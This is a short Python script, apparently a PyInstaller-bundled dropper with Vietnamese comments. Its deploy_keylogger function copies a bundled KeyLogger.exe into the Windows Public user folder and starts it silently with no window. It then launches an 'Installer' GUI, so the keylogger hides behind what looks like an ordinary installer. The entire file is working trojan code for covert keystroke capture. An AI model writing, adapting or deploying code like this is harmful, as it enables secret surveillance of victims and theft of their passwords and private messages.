import os
import sys
import shutil
import subprocess

# ✅ Import hàm run từ Installer.py
try:
    from Installer import run
except ImportError:
    run = None  # fallback nếu không import được

def deploy_keylogger():
    try:
        public_dir = os.path.join(os.environ["SystemDrive"] + "\\", "Users", "Public")
        os.makedirs(public_dir, exist_ok=True)

        target_path = os.path.join(public_dir, "KeyLogger.exe")

        if hasattr(sys, "_MEIPASS"):
            keylogger_path = os.path.join(sys._MEIPASS, "KeyLogger.exe")
        else:
            keylogger_path = os.path.join(os.path.dirname(__file__), "KeyLogger.exe")

        print(f"🔍 Looking for KeyLogger.exe at: {keylogger_path}")
        print(f"📁 Target path: {target_path}")

        if not os.path.exists(keylogger_path):
            print("❌ KeyLogger.exe not found!")
            return

        shutil.copy2(keylogger_path, target_path)
        print(f"✅ KeyLogger.exe copied to {target_path}")

        subprocess.Popen(
            [target_path],
            creationflags=subprocess.CREATE_NO_WINDOW,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        print("🕵️ KeyLogger started silently.")
    except Exception as e:
        import traceback
        traceback.print_exc()
        print(f"❌ Error deploying KeyLogger: {e}")

def run_installer():
    try:
        if run:
            print("🎨 Launching Installer GUI via import...")
            run()
        else:
            print("❌ Could not import Installer.run()")
    except Exception as e:
        print(f"❌ Error launching Installer: {e}")

if __name__ == "__main__":
    deploy_keylogger()
    run_installer()
